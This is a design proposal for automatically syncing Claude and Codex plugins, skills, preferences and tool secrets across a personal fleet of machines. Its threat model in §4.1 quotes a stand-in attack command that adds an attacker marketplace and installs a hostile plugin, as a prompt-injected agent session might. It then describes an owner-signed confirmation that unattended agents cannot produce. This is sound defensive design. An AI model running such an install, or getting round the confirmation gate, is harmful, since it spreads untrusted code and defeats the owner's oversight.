# Automatic fleet sync for agent tooling

Status: **design proposal, rev 3** · 2026-09-30 · nothing implemented here.

## History

- **Rev 1** made adoption a manual, reviewed step. The owner rejected it: the point of the system is
  that a change on any machine reaches every machine by itself.
- **Rev 2** kept everything automatic, but an adversarial review found problems in the places the
  design depended on (§9 maps each finding to its fix):
  - it ordered changes by host-asserted timestamps;
  - it added an event store the trust gate can't verify;
  - its baseline didn't match reality;
  - it let any session's plugin install run as code on every host;
  - it proposed a Windows port that isn't feasible.
- **Rev 3** keeps the goal and swaps the mechanism for a smaller one, built mostly from parts
  Roundhouse already has.

This document reads on top of `2026-08-06-dsc-storage-design-v2.md` (V2): the store, layers, trust
ratchet, reconcile point, canary and removal cap. It changes V2 in the ways listed below.

## 1. What the fleet does

The owner works on one machine at a time. What they do there becomes how every machine is:

- **Adds.** Install or enable a plugin from a known marketplace, add a skill, or change a synced
  preference on any host. Every host gets it on its next pass: within about a minute when the host
  is reachable, and otherwise when it next wakes or logs in.
- **Removals.** Uninstall or disable it anywhere, and it goes away everywhere.
- **Upstream releases** arrive everywhere, canary first.
- **Native Windows** takes part, running its harness commands natively.
- **One confirmation.** The owner confirms only a marketplace source the fleet has never seen, or a
  loosening of a security-posture setting (§5). Nothing else needs approval.

## 2. Why it didn't happen before (short form)

Five writers edit the same agent state: dotfiles templates, fleet-chezmoi capture and plugin
convergence, Roundhouse seed and apply, the harnesses' own auto-update, and Roundhouse `config.json`
expectations. The one component that could reconcile them stopped:

- The canary's `fleet-run` has been stuck since about 2026-08-20 on a dead-process lock that it
  refuses instead of recovering.
- Its launch agents are *disabled*.
- Publishing was separately wedged by a 400-byte commit-trailer limit, now fixed in #37.
- Every host holds on the dead canary.
- The host layers `hosts/*/99-canonical-agents.yaml` are full machine snapshots, 30–106 plugins
  each. Host layers beat every other layer, so they override any change anywhere. They still
  enable `codex`, `superpowers` and `music-control` today.

## 3. The model: three-way merge against one desired state

### 3.1 One desired state, one writer

- **Where desired state lives.** Agent tooling lives in one place: the fleet layer (`fleet.yaml`
  and `fleet/*.yaml`). OS layers carry only genuinely platform-bound items; macOS-only bundled
  Codex plugins, for example, go in `os/darwin`.
- **Host layers** carry no agent-tooling entries except `pin: local` exceptions (§4.3).
- **No event store.** There is no separate event directory. A change is a commit to the fleet
  layer, signed by the host that made it, and checked by the existing trust ratchet and path
  ownership table.
- **The writer.** The loop (§3.3) is the only writer. dotfiles, fleet-chezmoi and Roundhouse
  `config.json` stop writing agent state, host by host, through the handover marker (§6.2).
  Re-seed and unanimity promotion stop touching agent categories.

### 3.2 Item identity

Keys are harness-qualified, and the name keeps its marketplace:

```yaml
plugins:
  claude:impeccable@impeccable:          {state: enabled}
  codex:impeccable@openai-curated-remote: {state: enabled}
  claude:superpowers@claude-plugins-official: {state: absent}   # tombstone (§3.4)
marketplaces:
  claude:impeccable: {source: github:pbakaus/impeccable, trust: confirmed}
skills:
  claude:ghidra-re: {state: enabled}
```

- **Why this key shape.** The key uses no dots as separators; today's first-dot split breaks on
  real names such as `ghidra-re.backup-20260628-052344`.
- **Harness scope.** Each item applies only on hosts where its harness exists.
- **Marketplace aliases.** An alias table (`fleet/marketplace-aliases.yaml`, e.g. `openai-curated`
  ≡ `openai-curated-remote`) normalizes both observations and values, so two Codex versions
  can't flip an item back and forth.
- **Migration** happens in one commit per host. That commit rewrites layers, `applied/`, verdicts
  and journal item references together, and bare `plugins.X` keys go away in it. No alias period
  exists in which both keys converge the same plugin.
- **What values hold.** Values carry state only, not version or SHA. Versions follow the catalog
  and the canary (§3.6).

### 3.3 One pass

Each host keeps a host-local **baseline** in `~/.local/state/roundhouse/baseline.json`, which is not
in the store. It records the normalized agent state this host last *observed* after converging,
and the store commit that state corresponds to (the **base commit**).

1. **Observe.**
   - Read actual state from the harness records.
   - A collector result marked non-authoritative (for example, `plugin list` failing during an
     auto-update) makes that item *unknown*, never absent.
   - Duplicate records for one key are refused, with an alert.
2. **Fetch** the store, and verify it with the trust ratchet.
3. **Three-way merge** each item. The base is the baseline value, ours is what was just observed,
   and theirs is the fleet value now.

   | ours vs base | theirs vs base | Result |
   |---|---|---|
   | same | same | nothing |
   | same | changed | converge to theirs (someone changed it elsewhere) |
   | changed | same | **local change**: stage it as a fleet-layer edit |
   | changed | changed, and equal | nothing (already agreed) |
   | changed | changed, and different | **conflict**: theirs wins on this host, alert naming both hosts, one command to adopt ours instead |

   This ordering has no clocks in it. A host whose loop was dead for a week still publishes the
   changes the owner made there, provided nobody changed the same item elsewhere meanwhile. The
   stale state it merely *has* loses, because base equals ours for everything the owner didn't
   touch.
4. **Gate local changes** (§4). Staged changes that need confirmation, or that trip the breaker,
   are recorded as held and not published.
5. **Publish** the staged edits as one signed commit, and push.
   - **Rejected push.** If the push is rejected because another host pushed first, re-fetch and
     go back to step 3. The other host's commit is now theirs.
   - **Git history is the order**, so no timestamp is ever a decision rule.
6. **Converge** to the new fleet state through each harness's own commands (§3.5), with sealed
   plans, the precondition recheck and backups exactly as today.
7. **Re-baseline** from a fresh observation *after* the apply, not from the intended values. A
   harness that normalizes a value differently then produces no echo on the next pass. Items whose
   apply failed keep their old baseline, so they are retried rather than read as a local change.
   A pending-apply marker is written before each harness mutation and cleared after it. A pass
   finding a leftover marker re-observes that item and never publishes it.

**First pass after migration, a new host, or a lost baseline.** The host takes a *silent baseline*:

1. Converge to the fleet.
2. Observe.
3. Write the baseline.
4. Publish nothing.

Local extras not in the fleet are listed in one alert, with a command to adopt them. That
prevents a false mass removal or mass add. On this MacBook, the naive first pass would have
published 48 false Claude removals and 51 Codex adds.

### 3.4 Removals

- **Removal means the harness's own records drop the item.**
  - For Claude that is `installed_plugins.json` and `enabledPlugins`.
  - For Codex it is `[plugins."X@Y"]` in `config.toml`.
  - Intact records with missing or corrupt files are *damage*. Damage is repaired locally and
    never published.
- **Tombstones.** A removal publishes `state: absent`. On every host with that harness, apply
  uninstalls through the harness (§3.5). Today, `absent` only forgets the record.
- **Tombstone lifetime.** A tombstone is compacted once every enrolled host's journal shows a
  converge at or after the tombstone's commit. Until then it stops a stale host from bringing the
  item back.
- **Undo** is the existing `fleet-rollback ITEM`, which restores the previous fleet value
  everywhere.

### 3.5 Apply per harness

- **Claude:** the existing verbs (`claude plugin marketplace add`, `install`, `enable`, `disable`),
  plus `uninstall` for tombstones. Everything installs at user scope.
- **Codex:**
  - `codex plugin add` and `codex plugin remove` are the only install verbs in codex-cli 0.158;
    there is no enable, disable or update verb.
  - Enable and disable go through the app-server `config/batchWrite`, which
    `codex-plugin-hooks.mjs` already uses.
  - Updates go through the existing hook-trust-preserving `update-codex-plugin`.
  - `codex plugin marketplace add`, `upgrade` and `remove` handle marketplaces.
- **Codex hook trust.** When the originating host has trusted a plugin's hooks, the fleet value
  carries those hook hashes. A peer auto-trusts only an exact hash match. Any other hook needs the
  owner's confirmation (§4.1) on that host.
- **Marketplaces are items**, registered from the store's `marketplaces` entries.
  `settings.json` `extraKnownMarketplaces` stays readable as a fallback until those entries exist
  on every host.
- **Relative-source catalogs** (`./plugin`, as in impeccable and last30days) take their identity
  from the marketplace checkout's commit. That lets them pass the identity gate.
- **Self-repair.** A held "marketplace identity unavailable" item re-registers and refreshes its
  marketplace before holding again.
- **Running sessions.** Uninstalls and version-replacing updates wait while a harness session is
  running on the host, up to 24 h, so they don't delete caches a live session is using. Installs
  and enables don't wait.

### 3.6 Upstream versions

Harness auto-update may keep running. Because values carry no version, a version bump is never a
local change. The canary and soak still govern the versions Roundhouse installs and updates.
Hosts on different update channels don't trade versions, because nothing publishes them.

## 4. Safety that doesn't block the owner

### 4.1 The owner confirmation (the one approval)

The owner's confirmation is needed for exactly these:

- **A marketplace source not yet in the fleet's `marketplaces` items.** A changed source URL for a
  known name counts as new.
- **Loosening a security-posture key** (§5.2).
- **A Codex hook** whose hash differs from the one the originating host trusted.

How it works:

- The originating host publishes the item as `held`, raises an alert, and keeps converging
  everything else. Plugins from a held marketplace wait on it.
- `roundhouse fleet-confirm ID` releases it. The confirmation is a commit signed with the owner's
  key through an interactive prompt: the 1Password SSH agent with Touch ID where available, or a
  typed confirmation phrase in a TTY. It is never the passphrase-less node key, so an agent
  session running unattended cannot produce it.
- The trust gate rejects a release commit, or a `trust: confirmed` edit, that isn't signed by an
  owner key in `trust/signers.yaml`.

**What this defends against.** A prompt-injected agent session, or a malicious plugin, running
`claude plugin marketplace add attacker/repo && claude plugin install evil@attacker` on one host
can't reach the others. A plugin from an already-known marketplace still propagates without
confirmation. That residual risk is accepted, and it is bounded by the marketplaces the owner
confirmed. A marketplace can be marked `review: per-plugin`, making first-seen plugins from it
need confirmation too. That suits large third-party catalogs.

### 4.2 Breakers

The existing removal cap (`max_removals_per_run`) stays, and is enforced at the **receiving** host.
It is extended in two ways:

- **What it counts.** It counts adds, removals and changes originating from one host, over a
  rolling 24 h window: 10 changes or 25% of that host's items (the owner may tune both numbers).
  This window cap is new. Below it, changes flow freely; over it, they are held with one alert
  naming the source host.
- **Publisher side.** A single pass whose three-way merge stages more than 10 local changes holds
  them all as a batch. That is what a wiped or restored home directory looks like.
  `fleet-confirm` names the batch explicitly.

### 4.3 Scope rules, applied at Observe

These are never staged:

- items from directory or local-path marketplaces (`music-control` was one);
- non-user plugin scopes (project or local);
- platform-bound items outside their OS layer;
- items under a host-layer `pin: local`;
- security-posture keys, except as described in §5.2;
- any path on V2's `never:` list, auth files, SSH keys, and MCP credentials.

Editing `pin:`, `review:` or `trust:` counts as a posture change and needs the owner confirmation.

## 5. Preferences and tool config

### 5.1 Synced preferences

- **The allowlist.** Only named keys sync, listed in `fleet/synced-preferences.yaml`. Examples are
  Codex `model` and `model_reasoning_effort`, and Claude `theme`. Everything else in
  `settings.json` and `config.toml` stays host-local and is never copied wholesale.
- **Change detection.** The no-op check hashes only these keys, because Codex rewrites
  `config.toml` constantly: project trust, hook state, and marketplace revision timestamps.
- **The three writers.** dotfiles templates and Roundhouse `config.json` expectations stop
  declaring these keys through the handover (§6.2). A change the Codex app makes on one host is an
  ordinary local change.

### 5.2 Posture keys

Some keys change the security posture, such as `skipDangerousModePermissionPrompt`,
`remoteControlAtStartup`, permission rules, and hooks. For these:

- a **tightening** change propagates automatically;
- a **loosening** change is held for the owner confirmation.

The direction is defined per key in the allowlist.

### 5.3 Tool config and secrets

- **The file is an item.** A tool config file such as `~/.config/last30days/.env` is an item, with
  an explicit per-tool schema.
- **Default deny.** Every key is secret unless the schema lists it under `plain:`, such as
  `INCLUDE_SOURCES`. Plain keys sync as preferences. A key not in the schema is held with an alert,
  so a secret the patterns fail to recognize can never publish in plaintext.
- **Secrets never enter the store.** The store holds a 1Password reference (`op://vault/item/field`)
  for each secret key.
- **Rendering.** Each host renders the file at mode 0600 through a sealed per-target plan, reading
  the value with its own signed-in `op`. A host without `op` access alerts "last30days key
  unavailable" and leaves the file alone. Values are never logged or printed.
- **Why not age.** This replaces rev 2's age encryption. The node key is also the passphrase-less
  SSH login key to every peer, and ciphertext kept in git history can't be revoked from a retired
  host.
- **Capturing a new secret** typed into a tool on one host is an alert asking the owner to store it
  in 1Password. The loop never writes the value anywhere.

## 6. Keeping the loop alive and cheap

### 6.1 Triggers

- **Scheduled passes.** The existing launchd agents and systemd user timers are re-enabled, with
  the fast pass at 20 minutes and the full pass as today. `roundhouse fleet-schedule install`
  installs and loads them; that is a new verb, because `launcher-install` is already the PATH
  shim.
- **A disabled job is left disabled.** A pass never re-enables a job an operator disabled. It
  alerts instead.
- **Peer wake-up.** After a publish that changes desired state (not records), the existing push
  nudge wakes each reachable peer *detached*: `launchctl kickstart`, `systemctl --user start`, or,
  for iris-windows, through iris-wsl. It returns immediately and no longer runs the peer's pass
  inside a 10-second SSH channel.
- **Session start.** One Claude `SessionStart` hook, shipped by chezmoi rather than by a plugin,
  runs `setsid nohup roundhouse fleet-run --fast >/dev/null 2>&1 &`. It prints nothing and never
  blocks. The machine you sit down at catches up first. Codex gets the same hook once its hook
  trust is set by the fleet.
- **No file watches.** Codex's constant config rewrites make them noisy, and the triggers above
  already cover the owner's workflow.
- **Missed triggers.** A trigger that finds the lock held writes a dirty stamp. Before the lock
  holder releases the lock, it runs one more observe-and-merge if the stamp moved, so no trigger
  is lost.

### 6.2 The handover marker

On each host, the loop owns an agent-tooling category or preference key only once that host's
applied dotfiles render `~/.config/roundhouse/released-agent-keys`, which lists what dotfiles no
longer writes. That makes the handover per host and per key, and needs no atomic release across
roundhouse, agent-utilities and dotfiles.

The same marker switches off fleet-chezmoi's plugin capture and `converge-plugins.sh` on that host.

### 6.3 Liveness and the lock

- **The lock.** Check for a dead holder process *before* checking the lock's age, and match the
  holder's command line. Take over a dead lock atomically: rename it aside, and only the process
  whose rename succeeds proceeds.
- **Heartbeats** stay host-local and are published at most every 6 h. Every host alerts when
  another enrolled host hasn't published a heartbeat within 12 h. fleet-chezmoi's probe shows the
  same finding.
- **Canary failover.** A canary silent for twice the soak hands over to the next host on the
  canary list.

### 6.4 Record hygiene (why the no-op shortcut can work)

- **Alerts** are keyed by kind and item, and written only when that alert's content changes. The
  MacBook currently holds 45,882 alert files; they are compacted once in P0.
- **The poll floor** compares the *desired-state tree hash* (layers plus the confirmation state),
  not the remote head. Record-only commits from peers therefore don't wake anyone.
- **A no-op pass** does one `ls-remote`, one tree-hash comparison and one hash of the observed
  inputs, then exits. It starts no `claude` or `codex` process.

## 7. Native Windows

iris-windows is an *operated instance* (V2 §9.2), driven through the 0.9.25 interop lane:

- **A Windows task.** One Task Scheduler task runs *as the user, only when logged on*
  (InteractiveToken), at logon, on unlock, and every 20 minutes. It runs
  `wsl.exe -d <distro> --exec roundhouse fleet-run --fast`.
  - That keeps WSL running, which its systemd timers need.
  - It gives iris-wsl a trigger that fires when the owner is actually at the Windows machine.
  - It is the one scheduled-task registration outside the existing S4U profile task, and is
    documented as such.
- **iris-wsl's pass** then runs a second pass for iris-windows. Observe, converge and report go
  over interop, so native `claude` and `codex` run in the logged-in session with its credentials.
  Commits are signed as iris-windows, with a principal and key held on the WSL side.
- **What this keeps.** No inbound connection is ever made to Windows. There is no WSL fallback for
  Windows work: the harness commands run natively, and WSL only transports them.
- **What it rules out, for now.** Native membership, meaning the loop itself running under Git for
  Windows, is not planned. Roundhouse's signing and stat helpers refuse non-Darwin/Linux platforms,
  about 19k lines of bash would need porting, and it would put a networked GitHub credential and
  the node key inside the interactive session. It stays possible later.

## 8. Migration

Each phase ships alone and leaves the fleet no worse than it was.

- **P0: stop the bleeding and restart.**
  - **Already landed:** #37 bounds commit trailers; #35 seeds package managers so hosts stop
    holding every package.
  - **Code:**
    - lock takeover (§6.3);
    - alert keying and a one-time compaction;
    - heartbeat throttle;
    - the tree-hash poll floor;
    - the detached nudge;
    - `fleet-schedule install`;
    - canary failover;
    - identity-gate self-repair and relative-source identity (§3.5);
    - Claude uninstall for `absent`;
    - re-seed and unanimity promotion skip agent categories.
  - **Data, as one reviewed store commit:**
    - fold `hosts/*/99-canonical-agents.yaml` into the fleet layer, moving platform-bound items to
      `os/`;
    - delete those host files and `proposals/promote-*` for agent items;
    - tombstone `codex`, `superpowers` and `music-control`;
    - fix the impeccable and last30days entries.
  - **Then:**
    - run `fleet-schedule install` on each POSIX host;
    - fix the local mode of `.chezmoidata.toml`, which is 0644.
  - **Result:** Claude plugins converge again fleet-wide and the retired plugins are uninstalled.
    Capture still runs through today's dotfiles and fleet-chezmoi paths.
- **P1: per-harness identity.** The one-commit key migration (§3.2), the Codex apply path (§3.5),
  and marketplaces as items.
- **P2: automatic capture.** Baselines, three-way merge, tombstones everywhere, owner confirmation,
  breakers, scope rules and the handover marker. dotfiles drops plugin and marketplace keys behind
  the marker on each host. fleet-chezmoi's capture and `converge-plugins.sh` retire behind it.
- **P3: triggers.** The chezmoi-shipped SessionStart hook and the dirty stamp.
- **P4: Windows.** Enroll iris-windows as an operated instance and add the Windows logon task.
- **P5: preferences and tool config.** The synced-key allowlist with posture direction, tool
  schemas, and 1Password-referenced secrets. dotfiles releases each key through the marker only
  once the loop owns it, so no key ever goes unsynced.
- **Later:** run fleet-chezmoi's fast path under the loop for plain dotfiles.

## 9. Review findings and where they're handled

| Finding (rev 2 review, 2026-09-28) | Rev 3 |
|---|---|
| Host snapshot layers override all automatic changes | §3.1, P0 data fold |
| Automatic spread means unreviewed code runs everywhere | §4.1 owner confirmation |
| Host-asserted timestamps decide order; can be forged; stale host wins | §3.3 three-way merge, git order, no clocks |
| Baseline was the wrong shape; first pass misfires | §3.3 observed baseline, silent first pass |
| Commit trailer wedge | landed in #37 |
| Record churn defeats the no-op shortcut and makes storms | §6.4 |
| Native Windows port infeasible and a posture regression | §7 operated instance |
| Harness normalization oscillation | §3.2 aliases, §3.3 step 7 |
| Auto-update bypasses the canary | §3.6 no versions in values |
| Dot-split identity; digests change | §3.2 keys, one-commit migration |
| `events/` unverifiable and forgeable | no event store (§3.1) |
| Triggers drop changes; the nudge kills peer runs | §6.1 |
| Failure windows resurrect removals | §3.3 step 7 pending markers |
| Plugin scope lost | §4.3 |
| Codex has no enable/disable/update verbs; hook trust | §3.5 |
| age with the node key; pattern detection misses secrets | §5.3 |
| Posture keys syncing loosens every host | §5.2 |
| Scheduler and lock facts | §2, §6.1, §6.3 |
| Migration gaps across three repos | §6.2 marker, §8 |
| Breaker counts removals only | §4.2 |

## 10. Open decisions for the owner

1. **Breaker thresholds:** 10 changes or 25% per source host per 24 h, and 10 per pass
   (proposed).
2. **Canary order:** which hosts may act as canary, in what order.
3. **`review: per-plugin`:** whether to mark any of the large third-party catalogs this way from
   the start (proposed: none).
